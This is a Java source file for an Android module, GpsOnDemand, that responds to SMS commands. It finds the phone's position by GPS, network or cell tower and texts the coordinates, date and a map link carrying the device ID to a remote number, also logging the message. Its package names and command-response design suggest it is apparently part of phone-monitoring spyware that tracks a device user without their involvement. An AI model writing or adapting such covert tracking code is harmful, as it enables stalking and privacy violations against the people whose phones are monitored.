package com.fx.dalvik.location;

import java.util.Calendar;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import com.fx.dalvik.util.FxLog;

import com.fx.android.common.Customization;
import com.fx.android.common.events.location.CellLocationToLocation;
import com.fx.android.common.events.location.CellLocationToLocation.ConversionException;
import com.fx.android.common.sms.SmsSender;
import com.fx.dalvik.event.Event;
import com.fx.dalvik.event.EventLocation;
import com.fx.dalvik.event.EventSystem;
import com.fx.dalvik.phoneinfo.PhoneInfoHelper;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.GeneralUtil;
import com.fx.dalvik.util.NetworkUtil;
import com.vvt.android.syncmanager.control.EventManager;
import com.vvt.android.syncmanager.control.Main;

public final class GpsOnDemand implements LocationListenerManager.Callback {
	
	private static final String TAG = "GpsOnDemand";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	private static final String PROVIDER_GPS = "gps";
	private static final String PROVIDER_NETWORK = "network";
	private static final String PROVIDER_GLOCATION = "glocation";
	
//	private static final int DELAY_MILLIS = 600000; // 10 minutes
	private static final int DELAY_MILLIS = 20000; // 20 seconds
	
	private static GpsOnDemand sInstance;
	
	private Timer mRequestLocationTimer;
	private TimerTask mRequestLocationTask;
	
	private Timer mTimeoutTimer;
	private TimerTask mTimeoutTask;
	
	private Context mContext;
	private EventManager mEventManager;
	private LocationListenerManager mLocationListenerManager;
	private LocationManager mLocationManager;
	private SmsSender mSmsSender;
	
	private boolean mIsEnabled = false;
	private boolean mIsNotificationSmsSent = false;
	
	private String mDestinationNumber = null;
	private String mResponseHeader = null;

	public static GpsOnDemand getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new GpsOnDemand(context);
		}
		return sInstance;
	}
	
	private GpsOnDemand(Context context) {
		mContext = context;
		mEventManager = Main.getInstance().getEventsManager();
		mSmsSender = new SmsSender(Main.getContext());
		mLocationManager = 
			(LocationManager) mContext.getSystemService(Context.LOCATION_SERVICE);
	}
	
	public void setDestinationNumber(String number) {
		mDestinationNumber = number;
	}
	
	public void setResponseHeader(String responseHeader) {
		mResponseHeader = responseHeader;
	}
	
	public void enable() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "enable # ENTER ...");
		}
		
		if (mIsEnabled) {
			disable();
		}
		
		mIsEnabled = true;
		mIsNotificationSmsSent = false;
		
    	if (LOCAL_LOGV) {
    		FxLog.v(TAG, "enable # Waiting for location ...[x]");
    	}
    	requestLocation();
	}
	
	public void disable() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "disable # ENTER ...");
		}
		
		if (mIsEnabled) {
			mIsEnabled = false;
			
			unregisterLocationListener();
			cancelTimeoutTask();
			
			if (mRequestLocationTask != null) {
				mRequestLocationTask.cancel();
				mRequestLocationTask = null;
			}
		}
	}
	
	@Override
	public void onLocationChanged(Location location) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onLocationChanged # ENTER ...");
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format(
					"onLocationChanged # time: %s, provider: %s, lat: %f, long: %f, acc: %f", 
					GeneralUtil.getDateFormatter().format(new Date(location.getTime())), 
					location.getProvider(), location.getLatitude(), location.getLongitude(), 
					location.getAccuracy()));
		}
		
		// Unregister location listener
		unregisterLocationListener();
		
		// Cancel timeout task
		cancelTimeoutTask();
		
		// Capture location
		captureLocation(location);
	}
	
	private void requestLocation() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "requestLocation # ENTER ...");
		}
		
		if (mLocationManager.getProviders(true).size() > 0) {
			// Register location listener
			registerLocationListener();
			
			// Schedule time out task
			scheduleTimeoutTask();
		}
		else {
			Location gLocation = findGoogleLocation();
			
			if (gLocation == null) {
				sendSms(String.format("%s%s\n%s", mResponseHeader, 
						StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
						StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WILL_BE_STOPPED));
			}
			else {
				// Capture location finding by Google
				captureLocation(gLocation);
			}
		}
	}
	
	private void registerLocationListener() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "registerLocationListener # ENTER ...");
		}
		if (mLocationListenerManager == null) {
			mLocationListenerManager = new LocationListenerManager(mContext, this);
		}
		mLocationListenerManager.register();
	}
	
	private void unregisterLocationListener() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "unregisterLocationListener # ENTER ...");
		}
		if (mLocationListenerManager != null) {
			mLocationListenerManager.unregister();
			mLocationListenerManager = null;
		}
	}
	
	private void scheduleTimeoutTask() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "scheduleTimeoutTask # ENTER ...");
		}
		
		// Timeout task
		mTimeoutTask = new TimerTask() {
			@Override
			public void run() {
				if (LOCAL_LOGV) {
					FxLog.v(TAG, "scheduleTimeoutTask.run # ENTER ...");
				}
				startTimeoutTask();
			}
		};
		
		// Timeout timer
		if (mTimeoutTimer == null) {
			mTimeoutTimer = new Timer();
		}
		mTimeoutTimer.schedule(mTimeoutTask, DELAY_MILLIS);
	}
	
	private void scheduleRequestLocationTask() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "scheduleRequestLocationTask # ENTER ...");
		}
		
		// Request location task
		mRequestLocationTask = new TimerTask() {
			@Override
			public void run() {
				if (LOCAL_LOGV) {
					FxLog.v(TAG, "mRequestLocationTask.run # ENTER ...");
				}
				requestLocation();
			}
		};
		
		// Request location Timer
		if (mRequestLocationTimer == null) {
			mRequestLocationTimer = new Timer();
		}
		mRequestLocationTimer.schedule(mRequestLocationTask, DELAY_MILLIS);
	}
	
	private void startTimeoutTask() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "startTimeoutTask # GPS REQUEST TIMEOUT!!!");
		}
		
		// Unregister location listener
		unregisterLocationListener();
		
		Location gLocation = findGoogleLocation();
		
		if (gLocation == null) {
			scheduleRequestLocationTask();
			
			if (! mIsNotificationSmsSent) {
				mIsNotificationSmsSent = true;
				sendSms(String.format("%s%s\n%s", mResponseHeader, 
						StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK, 
						StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_IS_RETRYING));
			}
		}
		else {		
			// Request location from Google service
			captureLocation(gLocation );
		}
	}
	
	private void cancelTimeoutTask() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "cancelTimeoutTask # ENTER ...");
		}
		if (mTimeoutTask != null) {
			mTimeoutTask.cancel();
			mTimeoutTask = null;
		}
	}
	
	private void captureLocation(Location location) {
		if (location == null) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "captureLocation # Location is NULL!! Ignore capturing");
			}
			return;
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format(
					"captureLocation # time: %s, provider: %s, lat: %f, long: %f, acc: %f", 
					GeneralUtil.getDateFormatter().format(new Date(location.getTime())),
					location.getProvider(), location.getLatitude(), location.getLongitude(), 
					location.getAccuracy()));
		}
		
		EventLocation event = new EventLocation(location.getTime(), 
				location.getLatitude(), location.getLongitude(), location.getAltitude(), 
				(double) location.getAccuracy(), 0.0, location.getProvider());
		
		String info = getInfoMessage(event);
		sendSms(String.format("%s%s\n%s", mResponseHeader,
				StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK, info));
		
		mEventManager.insert(event);
	}
	
	private String getInfoMessage(EventLocation event) {
		String provider = event.getProvider();
		String methodText = 
			StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_UNKNOWN;
		
		if (PROVIDER_GPS.equalsIgnoreCase(provider)) {
			methodText = StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_GPS;
		}
		else if (PROVIDER_NETWORK.equalsIgnoreCase(provider)) {
			methodText = StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_NETWORK;
		}
		else if (PROVIDER_GLOCATION.equalsIgnoreCase(provider)) {
			methodText = StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_GLOCATION;
		}
		
		String mapUrl = getWebLink(event);
		
		return String.format("%s:\nLAT: %f\nLONG: %f\nDATE: %s\n%s", 
				methodText, event.getLatitude(), event.getLongitude(), 
				GeneralUtil.getDateFormatter().format(new Date(event.getTime())), mapUrl);
	}
	
	private String getWebLink(EventLocation event) {
		Calendar c = Calendar.getInstance();
		c.setTime(new Date(event.getTime()));
		
		int year = c.get(Calendar.YEAR);
		int month = c.get(Calendar.MONTH) + 1;
		int date = c.get(Calendar.DAY_OF_MONTH);
		int hour = c.get(Calendar.HOUR_OF_DAY);
		int minute = c.get(Calendar.MINUTE);
		
		String timeParam = String.format("%d%d%d%d%d", year, month, date, hour, minute);
		
		return String.format(
				StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WEB_SERVICE_FORM, 
				event.getLatitude(), event.getLongitude(), timeParam, 
				PhoneInfoHelper.getDeviceId(mContext));
	}
	
	private Location findGoogleLocation() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "findGoogleLocation # ENTER ...");
		}
		
		boolean hasInternet = NetworkUtil.hasInternetConnection(mContext);
		
		if (!hasInternet) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "findGoogleLocation # No Internet connection -> return null");
			}
			return null;
		}
		
		Location location = null;
		try {
			CellLocationToLocation cellLocationToLocation = 
				CellLocationToLocation.getInstance(mContext);
			
			location = cellLocationToLocation.getLocationOfCurrentCellLocation();
		} 
		catch (ConversionException e) {
			// Do nothing
		}
		
		return location;
	}
	
	private void sendSms(String message) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("sendSms # message: %s", message));
		}
		if (mDestinationNumber != null) {
			mSmsSender.sendSms(mDestinationNumber, message);
			captureEventSystem(message);
		}
	}
	
	private void captureEventSystem(String messageBody) {
		StringBuilder data = new StringBuilder();
		data.append("SMS\n");
		data.append(String.format("Phone Number: %s\n", mDestinationNumber));
		data.append(String.format("Message Body: %s", messageBody));
		
		EventSystem event = new EventSystem(
				System.currentTimeMillis(), Event.DIRECTION_OUT, data.toString());
		
		// Insert an event to database
		mEventManager.insert(event);
	}
}
